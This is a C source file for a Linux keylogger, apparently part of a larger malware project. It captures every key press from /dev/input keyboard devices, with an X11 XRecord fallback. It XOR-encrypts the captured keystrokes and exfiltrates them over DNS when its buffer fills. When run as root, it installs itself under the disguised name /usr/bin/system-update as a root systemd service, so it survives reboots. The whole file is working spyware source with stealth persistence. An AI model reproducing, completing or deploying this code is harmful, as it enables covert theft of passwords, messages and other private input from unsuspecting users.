#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <dirent.h>
#include <pthread.h>

#include "../common/crypto.h"
#include "../common/network.h"

#define MAX_DEVICES 10
#define BUFFER_SIZE 4096

typedef struct {
    int fd;
    char device_path[256];
    pthread_t thread;
} InputDevice;

static InputDevice devices[MAX_DEVICES];
static int device_count = 0;
static unsigned char crypto_key[32];
static unsigned char buffer[BUFFER_SIZE];
static size_t buffer_pos = 0;
static pthread_mutex_t buffer_mutex = PTHREAD_MUTEX_INITIALIZER;

const char* keycode_to_char(int keycode) {
    static const char* keycodes[] = {
        "", "<ESC>", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "<BACKSPACE>",
        "<TAB>", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<ENTER>",
        "<CTRL>", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`",
        "<SHIFT>", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<SHIFT>",
        "*", "<ALT>", " ", "<CAPS>", "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>",
        "<F7>", "<F8>", "<F9>", "<F10>", "<NUM>", "<SCROLL>", "7", "8", "9", "-",
        "4", "5", "6", "+", "1", "2", "3", "0", ".", "", "", "", "<F11>", "<F12>"
    };
    
    if (keycode >= 0 && keycode < sizeof(keycodes)/sizeof(keycodes[0])) {
        return keycodes[keycode];
    }
    return "";
}

// Real input device monitoring thread
void* monitor_device(void* arg) {
    InputDevice* device = (InputDevice*)arg;
    struct input_event ev;
    ssize_t bytes;
    
    while (1) {
        bytes = read(device->fd, &ev, sizeof(ev));
        if (bytes < sizeof(ev)) {
            break; // Device disconnected or error
        }
        
        // Process key events
        if (ev.type == EV_KEY && ev.value == 1) { // Key press
            const char* key_str = keycode_to_char(ev.code);
            if (strlen(key_str) > 0) {
                // Create log entry
                char log_entry[256];
                snprintf(log_entry, sizeof(log_entry), "[%ld] %s\\n", 
                        ev.time.tv_sec, key_str);
                
                // Add to encrypted buffer
                pthread_mutex_lock(&buffer_mutex);
                
                size_t entry_len = strlen(log_entry);
                if (buffer_pos + entry_len < BUFFER_SIZE - 1) {
                    memcpy(buffer + buffer_pos, log_entry, entry_len);
                    buffer_pos += entry_len;
                    
                    // Encrypt in place
                    xor_encrypt(buffer + buffer_pos - entry_len, entry_len, crypto_key, 32);
                }
                
                // Exfiltrate when buffer is nearly full
                if (buffer_pos > BUFFER_SIZE - 256) {
                    exfiltrate_dns_real(buffer, buffer_pos);
                    buffer_pos = 0;
                }
                
                pthread_mutex_unlock(&buffer_mutex);
            }
        }
    }
    
    return NULL;
}

// Real input device discovery
int discover_input_devices() {
    DIR* input_dir;
    struct dirent* entry;
    char device_path[256];
    int fd;
    
    input_dir = opendir("/dev/input");
    if (!input_dir) {
        return 0;
    }
    
    device_count = 0;
    
    while ((entry = readdir(input_dir)) != NULL && device_count < MAX_DEVICES) {
        // Look for event devices
        if (strncmp(entry->d_name, "event", 5) == 0) {
            snprintf(device_path, sizeof(device_path), "/dev/input/%s", entry->d_name);
            
            // Try to open device
            fd = open(device_path, O_RDONLY | O_NONBLOCK);
            if (fd >= 0) {
                // Check if it's a keyboard device
                unsigned long evbit = 0;
                if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit) >= 0) {
                    if (evbit & (1 << EV_KEY)) {
                        // It's a keyboard device
                        devices[device_count].fd = fd;
                        strcpy(devices[device_count].device_path, device_path);
                        device_count++;
                        continue;
                    }
                }
                close(fd);
            }
        }
    }
    
    closedir(input_dir);
    return device_count;
}

// Real X11 keylogger (alternative method)
#ifdef HAVE_X11
#include <X11/Xlib.h>
#include <X11/extensions/record.h>

static Display* display = NULL;
static Display* data_display = NULL;

void x11_key_callback(XPointer closure, XRecordInterceptData* data) {
    if (data->category == XRecordFromServer) {
        xEvent* event = (xEvent*)data->data;
        
        if (event->u.u.type == KeyPress) {
            char log_entry[128];
            snprintf(log_entry, sizeof(log_entry), "[X11] Key: %d\\n", event->u.u.detail);
            
            pthread_mutex_lock(&buffer_mutex);
            
            size_t entry_len = strlen(log_entry);
            if (buffer_pos + entry_len < BUFFER_SIZE - 1) {
                memcpy(buffer + buffer_pos, log_entry, entry_len);
                xor_encrypt(buffer + buffer_pos, entry_len, crypto_key, 32);
                buffer_pos += entry_len;
            }
            
            pthread_mutex_unlock(&buffer_mutex);
        }
    }
    
    XRecordFreeData(data);
}

int start_x11_keylogger() {
    display = XOpenDisplay(NULL);
    if (!display) return 0;
    
    data_display = XOpenDisplay(NULL);
    if (!data_display) {
        XCloseDisplay(display);
        return 0;
    }
    
    XRecordClientSpec clients = XRecordAllClients;
    XRecordRange* range = XRecordAllocRange();
    if (!range) return 0;
    
    range->device_events.first = KeyPress;
    range->device_events.last = KeyRelease;
    
    XRecordContext context = XRecordCreateContext(display, 0, &clients, 1, &range, 1);
    if (!context) {
        XFree(range);
        return 0;
    }
    
    XFree(range);
    
    // Start recording in separate thread
    if (!XRecordEnableContext(data_display, context, x11_key_callback, NULL)) {
        XRecordFreeContext(display, context);
        return 0;
    }
    
    return 1;
}
#endif

// Real stealth installation
void install_stealth() {
    char exe_path[256];
    char target_path[] = "/usr/bin/system-update";
    
    // Get current executable path
    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path)) == -1) {
        return;
    }
    
    // Copy to system location
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "cp %s %s && chmod +x %s", 
             exe_path, target_path, target_path);
    system(cmd);
    
    // Create systemd service
    FILE* service = fopen("/etc/systemd/system/system-update.service", "w");
    if (service) {
        fprintf(service, "[Unit]\\n");
        fprintf(service, "Description=System Update Service\\n");
        fprintf(service, "After=network.target\\n\\n");
        fprintf(service, "[Service]\\n");
        fprintf(service, "Type=simple\\n");
        fprintf(service, "ExecStart=%s\\n", target_path);
        fprintf(service, "Restart=always\\n");
        fprintf(service, "User=root\\n\\n");
        fprintf(service, "[Install]\\n");
        fprintf(service, "WantedBy=multi-user.target\\n");
        fclose(service);
        
        system("systemctl daemon-reload");
        system("systemctl enable system-update.service");
    }
}

int main() {
    // Generate encryption key
    generate_system_key_real(crypto_key, 32);
    
    // Install stealth persistence if root
    if (getuid() == 0) {
        install_stealth();
    }
    
    // Discover and monitor input devices
    if (discover_input_devices() > 0) {
        printf("Found %d keyboard devices\\n", device_count);
        
        // Start monitoring threads
        for (int i = 0; i < device_count; i++) {
            pthread_create(&devices[i].thread, NULL, monitor_device, &devices[i]);
        }
        
        // Wait for threads
        for (int i = 0; i < device_count; i++) {
            pthread_join(devices[i].thread, NULL);
        }
    }
    
#ifdef HAVE_X11
    // Fallback to X11 if input devices not accessible
    else {
        printf("Falling back to X11 keylogger\\n");
        start_x11_keylogger();
    }
#endif
    
    return 0;
}